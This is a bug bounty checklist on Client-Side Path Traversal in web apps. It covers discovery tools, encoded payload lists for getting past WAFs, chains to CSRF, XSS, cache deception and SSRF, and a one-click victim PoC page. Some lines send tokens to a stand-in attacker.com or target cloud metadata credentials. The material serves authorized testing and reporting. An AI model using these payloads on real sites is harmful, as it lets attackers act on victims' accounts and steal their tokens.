# Client-Side Path Traversal (CSPT) — Bug Bounty Hunting Checklist

> **What it is:** CSPT (also called On-Site Request Forgery / OSRF) occurs when user-controlled input is injected unsanitized into the **path** of a `fetch()` / `XHR` / `axios` call inside the browser. The browser resolves `../` sequences, redirecting the request to an unintended API endpoint — carrying the victim's cookies, Authorization headers, and CSRF tokens automatically. This **bypasses SameSite cookies AND anti-CSRF tokens**.
>
> **What it is NOT:** This is not server-side LFI. It reads no files. It redirects authenticated browser API calls.
>
> **Standalone impact:** Low/Informational. **Chained impact:** Critical (CSRF, XSS, ATO, SSRF, RCE).

---

## Why CSPT Beats Classic CSRF

| Capability | Classic CSRF | CSPT2CSRF |
|---|---|---|
| Perform POST actions | ✅ | ✅ |
| Bypass anti-CSRF tokens | ❌ | ✅ |
| Bypass SameSite=Lax | ❌ | ✅ |
| 1-click attack | ❌ | ✅ |
| GET/PUT/DELETE methods | ❌ | ✅ |

The request originates from the legitimate same-origin JS — the browser treats it as a first-party request, attaches all credentials, and passes any CSRF token checks.

---

## Phase 1 — Target Profiling (Where to Hunt)

CSPT lives in SPAs and REST API-driven apps. Prioritize:

### High-Value Application Types
- [ ] **React / Next.js** — `useParams()`, `useSearchParams()`, dynamic routes `/posts/[id]`
- [ ] **Vue.js** — `$route.params`, `$route.query` fed into `axios`
- [ ] **Angular** — `ActivatedRoute.params` fed into `HttpClient`
- [ ] **Electron apps** — desktop apps built on web tech; same JS sinks, harder sandbox
- [ ] Any app with **invite codes, referral codes, token parameters** in URLs
- [ ] Any app with **file upload → JSON response** flows (gadget source)
- [ ] Any app using **axios** specifically (auto-decodes `%2E` → `.` before building URL)
- [ ] Apps with **CDN-cached API responses** (CSPT → Cache Deception chain)

### High-Value Feature Areas
- [ ] Invitation / sign-up flows: `?inviteCode=`, `?token=`, `?referral=`
- [ ] Profile / user / resource pages: `/users/:slug`, `/items/:id`
- [ ] Document / file viewers: `/docs/:docId`, `/files/:filename`
- [ ] NFT / marketplace collection pages: `/nft/:collection/:itemId`
- [ ] Download / export buttons that append a filename to an API path
- [ ] Notification / messaging: `?next=`, `?redirect=`, `?clone=`
- [ ] Plugin / extension loaders: `/plugins/:name/assets`
- [ ] Dashboard widgets with user-controlled data source paths

---

## Phase 2 — Passive Discovery

### 2.1 CSPTBurpExtension (Primary Tool — Burp Required)
```
Requirements: Burp Suite Pro or Community, Java 17+
Install:
  sudo apt install -y openjdk-17-jdk
  git clone https://github.com/doyensec/CSPTBurpExtension
  # Load build/CSPTBurpExtension.jar via Burp → Extender → Add → Java

Workflow:
  1. Load extension → browse the target application completely (logged in)
  2. Extension passively monitors proxy history
  3. Correlates: any parameter that later appears in a different request's PATH = CSPT source
  4. Right-click source → "Send sinks(host/method) To Organizer"
  5. Export sources with canary tokens for bulk manual validation
  6. Right-click false positives → mark as FP to clean results
```

### 2.2 Gecko (Chrome Extension — Real-Time DOM Monitoring)
```
Install: https://github.com/vitorfhc/gecko → Load as unpacked Chrome extension

Workflow:
  1. Open target in Chrome with Gecko active
  2. Browse the app — Gecko logs every XHR/fetch call in its DevTools panel
  3. "Findings" panel shows parameters that were reflected into request paths
  4. Note every flagged parameter → manually inject traversal payloads
```

### 2.3 Reflection Logger (Chrome Extension — Quick Recon)
```
Install: https://github.com/davwwwx/Reflection-Logger → Load as unpacked Chrome extension

Usage:
  - Browse target normally
  - Extension logs XHR/fetch calls where URL parameters appear in request paths
  - Popup shows potential reflected params → candidate CSPT sources
```

### 2.4 Eval Villain (Firefox — DOM Instrumentation & Electron)
```
Install: Eval Villain Firefox extension

Setup:
  1. Enable "Path search" in Eval Villain's Enable/Disable menu
  2. Go to config page → Globals table → activate "evSourcer" row
  3. Click Types menu → enable "objects" (to see JS objects passed to fetch)

Workflow:
  1. Navigate to a suspicious page → refresh
  2. Eval Villain logs all fetch/XHR calls with source parameters
  3. Look for params containing path components
  4. Test: append %2fasdf%2f.. to URL — if behavior unchanged, likely vulnerable
  5. Use stack trace → find "magic zone" (minified → readable code boundary)
  6. Set conditional breakpoint using evSourcer → check for secondary sinks

For Electron apps:
  Config page bottom → "Copy Injection" → paste into app's DevTools console
  OR inject via conditional breakpoint in Burp's embedded Chrome
```

### 2.5 Manual JavaScript Source Review (CLI)
```bash
# Download all JS files from target
wget -r -l 2 -A "*.js" --no-parent https://target.com/static/ -q

# Find fetch() calls with dynamic paths
grep -r "fetch(" . --include="*.js" | grep -E "\+|template|interpolat|\`" | grep -vE "(\.test\.|spec\.)" | head -50

# Find axios calls with dynamic paths
grep -r "axios\.\(get\|post\|put\|delete\|patch\)" . --include="*.js" \
  | grep -E "\+|\`|params|path|slug|id|url" | head -50

# Find XHR calls with dynamic paths
grep -r "\.open(" . --include="*.js" | grep -E "\+|\`" | head -50

# Find route params being used in API paths (React patterns)
grep -rE "(useParams|useSearchParams|params\.)" . --include="*.js" \
  | grep -v "//.*useParams" | head -30

# Find URL construction patterns
grep -rE "(location\.(pathname|hash|search)|URLSearchParams)" . --include="*.js" \
  | grep -E "(fetch|axios|xhr|open\()" | head -30
```

---

## Phase 3 — Sources & Sinks Mapping

### 3.1 Source Types to Identify
| Source | Example | Where to Look |
|---|---|---|
| URL query param → path | `?id=abc` → `/api/items/abc/details` | Burp Proxy history |
| URL fragment → path | `#../../admin` → API call | DevTools Network tab |
| Route parameter | `/posts/:postId` used in API | JS source, React Router |
| Stored slug / ID | NFT name, profile slug in DB → API path | Profile pages, collections |
| Invite / referral codes | `?inviteCode=123/../../../endpoint` | Auth flows |
| Download filename | Export button appends filename to API path | Export features |
| `?clone=` / `?next=` | Jupyter-style clone param | Dashboard, clone/copy features |
| CSS resource paths | `background: url(../../theme.css)` | Theming, customization features |
| Service worker URLs | User paths in fetch handlers | PWA inspection |

### 3.2 Sink Types to Find
| Sink | Impact | Detection |
|---|---|---|
| `fetch('/api/' + input)` | CSRF / OSRF | Grep JS, Gecko, CSPTBurpExtension |
| `axios.get('/api/' + input)` | CSRF / OSRF | Grep JS (axios auto-decodes `%2E`) |
| `xhr.open('GET', '/api/' + input)` | CSRF / OSRF | Grep JS, Eval Villain |
| `<script src="/api/" + input>` | XSS | DOM Inspector |
| `<link href="/api/" + input>` | CSS Injection | DOM Inspector |
| `import('/plugins/' + input)` | XSS | Grep JS for dynamic import |
| API response cached by CDN | Cache Deception → ATO | Response headers, CDN config |

---

## Phase 4 — Manual Testing

### 4.1 Baseline Traversal Injection
For every candidate source parameter, inject and observe:
```
ORIGINAL: https://target.com/app?id=abc123
TEST:     https://target.com/app?id=abc123/../../../traversed

ORIGINAL: https://target.com/posts/POSTID/view
TEST:     https://target.com/posts/POSTID%2f..%2f..%2ftraversed/view
```

**Signs of success:**
- Response changes (different JSON, 404 on different endpoint, error from traversed path)
- Network tab shows fetch to `/api/traversed` instead of `/api/items/abc123`
- 401/403 from an unexpected endpoint (confirms traversal hit something real)

### 4.2 Payload List — Try in Order
```
# Level 0 — Raw (works if no WAF)
../../../target-endpoint

# Level 1 — Single URL encode
%2e%2e%2f%2e%2e%2f%2e%2e%2ftarget-endpoint
..%2f..%2f..%2ftarget-endpoint

# Level 1 — Backslash (browsers treat \ as / in paths)
..\..\..\target-endpoint
..%5c..%5c..%5ctarget-endpoint

# Level 2 — Double URL encode (WAF bypass)
%252e%252e%252f%252e%252e%252f%252e%252e%252ftarget-endpoint
..%252f..%252f..%252ftarget-endpoint

# Level 1 dots, Level 2 slash (mixed)
%2e%2e%252f%2e%2e%252f%2e%2e%252ftarget-endpoint

# Nested (non-recursive strip bypass)
....//....//....//target-endpoint
....%2f....%2f....%2ftarget-endpoint

# Hash fragment elimination (removes server-side validation of remainder)
https://target.com/app?id=abc/../../../api/admin/action#

# Query string terminator (useful when appended before fixed suffix)
?id=../../target-endpoint?a=
?id=../../target-endpoint%3fa=

# Null byte (edge case for older backends)
?id=../../target-endpoint%00
```

### 4.3 Axios-Specific Payload
> Axios automatically decodes `%2E` → `.` before building the request URL. So this bypasses even when raw `..` is blocked by the frontend:
```
?id=abc%2E%2E%2F%2E%2E%2Ftarget-endpoint
```

### 4.4 Mapping Available Endpoints (to Find the Best Sink)
```bash
# Crawl the API surface to know what endpoints exist
# Use Burp's Site Map after browsing thoroughly
# Or use katana to crawl API docs / swagger / JS files

# Extract endpoints from JS bundle
grep -ohE '"/api/v[0-9]+/[^"]*"' app.js | sort -u

# Check Swagger / OpenAPI spec (common CSPT research starting point)
curl -s https://target.com/api/swagger.json | python3 -m json.tool | grep '"path"'
curl -s https://target.com/api/v1/openapi.yaml | grep "^  /"
```

Once you know the API surface, identify **state-changing sinks**:
- `DELETE /api/v1/users/:id`
- `POST /api/v1/admin/actions`
- `PUT /api/v1/account/email`
- `POST /api/v1/payment/cancel`

---

## Phase 5 — Escalation Chains (Never Report CSPT Alone)

### 5.1 CSPT → CSRF (CSPT2CSRF) — Primary Chain
```
Step 1: Confirm traversal — fetch() goes to unintended path ✓
Step 2: Identify a state-changing API endpoint reachable via traversal
         e.g., POST /api/v1/account/delete or DELETE /api/v1/cards/:id/cancel
Step 3: Map the source parameter to reach that sink
         e.g., ?inviteCode=123456789/../../../cards/VICTIM_CARD_ID/cancel?a=
Step 4: Send the crafted URL to victim
Step 5: When victim CLICKS the "Accept Invitation" button:
         → their browser sends DELETE /api/v1/cards/VICTIM_CARD_ID/cancel
         → with victim's cookies + CSRF token
         → SameSite bypass: request originates from legitimate origin JS
Step 6: Action performed on victim's account without their knowledge
```

**PoC URL structure:**
```
https://target.com/invite?inviteCode=TOKEN/../../../api/v1/account/settings/email?a=
https://target.com/posts/POSTID%2f..%2f..%2f..%2fapi%2fv1%2fusers%2fme%2fdelete%3fa=
```

### 5.2 CSPT → XSS
```
Scenario A: fetch() result rendered unsanitized into DOM
  1. Traversal redirects fetch to endpoint returning attacker-controlled JSON
  2. JSON field (e.g., "title") injected into innerHTML
  3. Payload: title field = <img src=x onerror=alert(origin)>

Scenario B: <script src> or dynamic import() with user-controlled path
  1. Find: import('/plugins/' + userInput + '/bundle.js')
  2. Traversal redirects to open redirect on same origin
  3. Open redirect loads external JS → XSS

Scenario C: newsitem/static file pattern
  Payload: ?newsitemid=../pricing/default.js?cb=alert(document.domain)//
  The // comments out the appended .json extension
```

### 5.3 CSPT → Cache Deception → ATO
```
Step 1: CSPT traverses to sensitive endpoint (e.g., /api/v1/user/tokens)
         that returns auth secrets/session tokens
Step 2: URL path now looks like a static asset: /static/css/../../../api/v1/user/tokens
Step 3: CDN/cache server sees "static asset" path → caches response
Step 4: Attacker requests same URL without authentication
Step 5: Cache returns victim's tokens → ATO
```

### 5.4 CSPT → SSRF
```
Scenario: CSPT traverses to an endpoint that makes server-side outbound requests
  e.g., Grafana plugin loader, webhook tester, image proxy

Step 1: Identify CSPT to /api/v1/render?url= or /api/v1/webhook/test
Step 2: That endpoint makes server-side request to the URL parameter
Step 3: Control URL → SSRF → internal services / cloud metadata
        http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 5.5 CSPT → Token Leak via Open Redirect (Jupyter Chain Pattern)
```
Step 1: CSPT traverses to login/auth endpoint:
        ?clone=../../../login%3fnext%3dhttps%3a%2f%2f%2fattacker.com
Step 2: Login endpoint redirects to attacker's server
Step 3: Browser sends auth/XSRF token in headers on redirect
Step 4: Attacker's server logs headers → token captured → ATO
```

### 5.6 Two-Hop CSPT (GET → POST Chain, via File Upload Gadget)
```
When there's no direct POST sink reachable via CSPT:

Step 1: Find a file upload endpoint that stores files with user-controlled IDs
Step 2: Upload a crafted JSON file with traversal payload as the "id" field:
        { "id": "../../../../api/v1/admin/action?a=", "data": "..." }
Step 3: CSPT GET sink fetches that uploaded file's ID from the API
Step 4: The returned JSON's "id" field is used in a second fetch() call (POST sink)
Step 5: The POST request hits /api/v1/admin/action with victim credentials
```

### 5.7 Stored CSPT (Persisted Traversal)
```
Scenario: User-controlled slug/name stored in DB and later used in API paths

Step 1: During account setup, set username/slug/company to: 
        admin%2f..%2f..%2f..%2fapi%2fv1%2fadmin%2fusers
Step 2: When any victim views your profile, their browser fetches:
        /api/v1/users/admin%2f..%2f..%2f..%2fapi%2fv1%2fadmin%2fusers/avatar
        → resolves to: /api/v1/admin/users
Step 3: Admin data returned to victim's browser → info disclosure / CSRF
```

---

## Phase 6 — WAF Bypass Techniques

Based on Matan Berson's encoding levels research:

### 6.1 Understanding WAF Level vs App Level
```
WAF Level = how many times the WAF URL-decodes before checking path depth
App Level = how many times the frontend decodes before passing to fetch()

Goal: make WAF see positive path depth while app sees traversal
```

### 6.2 WAF Level < App Level (WAF decodes less than the app)
```
Use double-encoding: WAF sees encoded dots (harmless), app decodes twice

Payload: ..%252f..%252f..%252ftarget-endpoint
WAF sees: ..%2f..%2f..%2f... (evaluates as non-traversal, allows)
App decodes: ../../../target-endpoint (traversal executes)
```

### 6.3 WAF Level = App Level (Both decode the same amount)
```
Use %2e%2e/ — browser treats as ../ but WAF may calculate positive depth

Payload: https://target.com/viewpost/%2e%2e/%2e%2e/%2e%2eredirect?u=https://attacker.com
WAF calculates: positive depth from encoded dots → allows
Browser: %2e%2e = .. → traversal executes
```

### 6.4 WAF Level > App Level (WAF decodes more than the app)
```
Inject harmless a/a segments at higher encoding levels
WAF decodes and sees: a/a/a → positive depth (allows)
App doesn't decode those segments → sees traversal from the ../

Example: ../a%2fa/../../../target (WAF's extra decode turns a%2fa into a/a which adds depth)
```

### 6.5 Bypass Technique Summary Table
```
Payload                          Bypass Type
../                              None (raw — use only if no WAF)
%2e%2e/                         Browser treats as ../
..%2f                           Encoded slash
%252e%252e%252f                  Double encode (WAF bypass)
..\  (backslash)                 Browser normalizes \ to / (Renwa Opera finding)
..%5c                            Encoded backslash
%252e%252e%2f                    Double-encoded dots, single-encoded slash
....//                           Strip bypass (non-recursive)
?id=../../endpoint%3fa=          Query terminator to cut off appended suffix
?id=../../endpoint#              Hash to eliminate server-side validation
```

---

## Phase 7 — File Upload Gadget Creation (Advanced)

> When you need a JSON gadget endpoint but the app restricts file uploads. From Doyensec's Jan 2025 research.

### 7.1 PDF Bypass (mmmagic library)
```json
{ "id": "../../../../CSPT_PAYLOAD", "%PDF": "1.4" }
```
mmmagic checks first 1024 bytes for `%PDF` magic bytes → validates as PDF. V8's `JSON.parse()` accepts this as valid JSON.

### 7.2 WEBP Image Bypass (file-type library)
```json
{"aaa":"WEBP","_id":"../../../../CSPT_PAYLOAD?"}
```
`file-type` checks for `WEBP` at byte offset 8. Position it there in the JSON string. Passes image validation, parses as JSON.

### 7.3 Large File Command Bypass
```
file command only reads first 1,048,576 bytes (1MB) by default
Pad your JSON file with spaces beyond 1MB → file command fails → uses fallback detection
Your content is valid JSON, passes JSON.parse()
```

### 7.4 Check V8 JSON whitespace tolerance
```javascript
// V8 JSON.parse() accepts these leading characters without error:
// space (0x20), tab (0x09), carriage return (0x0D), newline (0x0A)
// This means you can prepend magic bytes inside whitespace-filled JSON
```

---

## Phase 8 — PoC Construction

### 8.1 Basic CSPT2CSRF PoC URL
```
1. Identify: parameter `inviteCode` is concatenated into:
   /api/v1/invitations/{inviteCode}/accept  (POST)

2. Know: DELETE /api/v1/cards/{cardId}/cancel exists

3. Craft payload:
   inviteCode = REAL_CODE/../../../cards/VICTIM_CARD_ID/cancel?a=

4. Full PoC URL:
   https://target.com/invite?email=victim@example.com&inviteCode=REAL_CODE/../../../cards/VICTIM_CARD_ID/cancel?a=

5. When victim clicks "Accept Invitation":
   → Browser POST to /api/v1/cards/VICTIM_CARD_ID/cancel
   → With victim's auth cookies/tokens
   → Card cancelled without victim's knowledge
```

### 8.2 Test Your PoC Before Reporting
```bash
# Confirm the traversal is happening in your own browser
# Open DevTools → Network tab → filter by XHR/Fetch
# Visit your PoC URL, perform the trigger action
# Verify the network request went to the traversed endpoint

# Confirm with Burp Proxy
# Add traversal param, click trigger, check Burp history for unexpected endpoint
```

### 8.3 Victim PoC Template (1-click CSRF)
```html
<!-- Minimal victim page for 1-click demonstration -->
<html>
<body>
  <p>Click to accept the invitation:</p>
  <a href="https://target.com/invite?inviteCode=TOKEN/../../../api/sensitive/action?a=">
    Accept Invitation
  </a>
  <!-- Or auto-click for 0-click demonstration -->
  <script>
    window.location = "https://target.com/invite?inviteCode=TOKEN/../../../api/sensitive/action?a=";
  </script>
</body>
</html>
```

---

## Phase 9 — Response Analysis

### Signs of Successful Traversal
- [ ] Network tab shows fetch to `/api/UNEXPECTED_ENDPOINT` instead of intended path
- [ ] Response JSON from a **different** endpoint structure than expected
- [ ] 401/403 from an unexpected path (confirms traversal hit a protected endpoint)
- [ ] 404 "Not Found" error from a path segment you injected (`/traversed`)
- [ ] Different HTTP status code compared to non-traversal request
- [ ] Burp shows request path changed compared to original

### Signs of a Useful Sink (to Chain CSRF)
- [ ] The alternate endpoint performs a **state-changing action** (DELETE, POST, PUT)
- [ ] The action occurs on a resource **owned by the victim** (their account, their data)
- [ ] The action does **not** require additional confirmation (no 2FA prompt, no re-auth)
- [ ] The action is **triggered by a user interaction** (button click, form submit, page load)

---

## Phase 10 — Reporting

### Severity Matrix
| CSPT Chain | Severity |
|---|---|
| Standalone traversal (no useful sink) | Low / Informational |
| CSPT → info disclosure (read other endpoint) | Low–Medium |
| CSPT → CSRF (non-sensitive state change) | Medium |
| CSPT → CSRF (account modification, deletion) | High |
| CSPT → XSS | Medium–High |
| CSPT → ATO (via Cache Deception or Token Leak) | Critical |
| CSPT → SSRF → cloud metadata | Critical |
| CSPT → RCE (DLL hijack in Electron) | Critical |

### PoC Checklist Before Submitting
- [ ] Video or step-by-step reproduction showing traversal + resulting action
- [ ] Network tab screenshot showing the fetch request hit the unexpected endpoint
- [ ] Proof that victim credentials were included (check `Cookie:` / `Authorization:` headers in request)
- [ ] Demonstrate the actual impact: what action was performed on the victim's account
- [ ] Test from a different account (attacker vs victim — not just same account)
- [ ] Include the encoding level required (note if WAF bypass was needed)

### Minimal Report Template
```
Vulnerability: Client-Side Path Traversal → CSRF (CSPT2CSRF)

Vulnerable parameter: inviteCode in https://target.com/invite

Traversal payload:
inviteCode=TOKEN/../../../api/v1/account/delete?a=

Steps to reproduce:
1. As attacker: send victim this URL:
   https://target.com/invite?inviteCode=TOKEN/../../../api/v1/account/delete?a=
2. Victim (logged in) visits the URL
3. Victim clicks "Accept Invitation"
4. Browser sends authenticated DELETE /api/v1/account/delete
5. Victim's account deleted without their consent

Why it bypasses protections:
- SameSite cookies: bypassed — request originates from legitimate same-origin JS
- Anti-CSRF tokens: bypassed — tokens from the legitimate origin are included
- The server cannot distinguish this from a legitimate user action

Impact:
Unauthenticated attacker can cause any authenticated user who clicks a crafted link
to perform [specific action] on their own account. [Describe business impact].
```

---

## CSPT Sources & Sinks Quick Reference

### Source Parameters to Watch in Proxy History
```
id, slug, name, path, file, resource, page, tab, view, section,
clone, next, redirect, return, inviteCode, token, referral,
collection, itemId, docId, postId, channelId, teamId,
newsitemid, templateId, widgetId, pluginId, themeId
```

### JS Patterns to Grep (High-Signal)
```javascript
fetch(`/api/${param}`)              // template literal
fetch('/api/' + param)              // concatenation
axios.get(`/api/${route.params.id}`)
xhr.open('GET', '/endpoint/' + id)
import(`/plugins/${name}/index.js`)
document.getElementById('frame').src = '/api/' + slug
```

### Framework-Specific Source Patterns
```javascript
// React Router
const { id } = useParams()
const [searchParams] = useSearchParams()
fetch(`/api/items/${id}/details`)     // ← CSPT if id unsanitized

// Next.js
const { slug } = router.query
fetch(`/api/${slug}/data`)            // ← CSPT if slug unsanitized

// Vue.js
this.$route.params.id
axios.get(`/api/${this.$route.query.id}`)  // ← CSPT

// Angular
this.route.snapshot.paramMap.get('id')
this.http.get(`/api/${id}`)          // ← CSPT
```

---

## Tool Stack Reference

| Tool | Type | Purpose | Link |
|---|---|---|---|
| **CSPTBurpExtension** | Burp Extension (Java) | Passive scanner, source/sink correlation | https://github.com/doyensec/CSPTBurpExtension |
| **Gecko** | Chrome Extension | Real-time XHR/fetch parameter reflection logging | https://github.com/vitorfhc/gecko |
| **Eval Villain** | Firefox Extension | DOM instrumentation, secondary sinks, Electron | Firefox Add-ons |
| **Reflection Logger** | Chrome Extension | Early-stage reflected param discovery | https://github.com/davwwwx/Reflection-Logger |
| **CSPTPlayground** | Practice App | CSPT2CSRF and CSPT2XSS gadgets to practice | https://github.com/doyensec/CSPTPlayground |
| **Burp Bambdas** | Burp Feature | Filter proxy history for CSPT patterns | Built into Burp Proxy |
| **DOM Invader** | Burp Feature | DOM sink detection (PortSwigger) | Built into Burp |

> **Note on CLI:** CSPT is primarily a browser/Burp vulnerability — the traversal happens in client-side JS and requires observing network calls. The JS grepping commands above are the main CLI workflow. Burp extensions do the heavy lifting.

---

## Key Real-World Payloads (Reference)

```
# Mattermost CVE-2023-45316 (POST sink CSPT2CSRF)
/<team>/channels/channelname?telem_action=x&telem_run_id=../../../../../../api/v4/caches/invalidate

# Jupyter CVE-2023-39968 (token leak via open redirect)
http://localhost:8888/lab?clone=../../../login%3fnext%3dhttps%3a%2f%2f%2fattacker.com

# Invite code CSPT2CSRF pattern (Doyensec whitepaper)
?inviteCode=123456789/../../../cards/CARD_ID/cancel?a=

# CSPT to XSS via static file (news item pattern)
?newsitemid=../pricing/default.js?cb=alert(document.domain)//

# Opera cashback backslash bypass (Renwa — $8k)
?id=..\..\..\..\..\.api\.cashback\.offers\[id]\link?redirect=https://attacker.com

# Reverb double-encoding bypass (Renwa — $5k)
/affiliates/comparison_shopping_embeds/%252e%252e%2f%252e%252e%2fattachinary%2fcors?_links[web]=

# NFT platform Next.js hash terminator (Renwa — $4k)
/nft/cryptopunks/1%2factivity%2f..%2f..%2f..%5ccryptopunksfakerenwa%252fassets%252f[id]

# GitLab branch name CSPT (Johan Carlsson — $6,580)
branch name: main%2E%2E%2F%2E%2E%2Freleases (decodes to path traversal in GitLab frontend)

# Profile URL hash fragment bypass
/users/~username%5C..%5C..%5C..%5C..%5C..%5C..%5Cab%5cmessages%5catt%5c[file-id]#
```

---

## References
- Doyensec CSPT2CSRF Blog: https://blog.doyensec.com/2024/07/02/cspt2csrf.html
- Doyensec Whitepaper (PDF): https://www.doyensec.com/resources/Doyensec_CSPT2CSRF_Whitepaper.pdf
- Doyensec CSPT Resources Hub: https://blog.doyensec.com/2025/03/27/cspt-resources.html
- File Upload Bypass Research: https://blog.doyensec.com/2025/01/09/cspt-file-upload.html
- Eval Villain Detection: https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html
- PayloadsAllTheThings CSPT: https://swisskyrepo.github.io/PayloadsAllTheThings/Client%20Side%20Path%20Traversal/
- Encoding Levels / WAF Bypass: https://matanber.com/blog/cspt-levels
- Renwa Bug Bounty Findings: https://medium.com/@renwa/client-side-path-traversal-cspt-bug-bounty-reports-and-techniques-8ee6cd2e7ca1
- Jupyter CVE-2023-39968: https://blog.xss.am/2023/08/cve-2023-39968-jupyter-token-leak/
- CSPTBurpExtension: https://github.com/doyensec/CSPTBurpExtension
- CSPTPlayground: https://github.com/doyensec/CSPTPlayground
- Full article references: [[1-Refreces/ARTICLES/ATTACK/CSPT]]
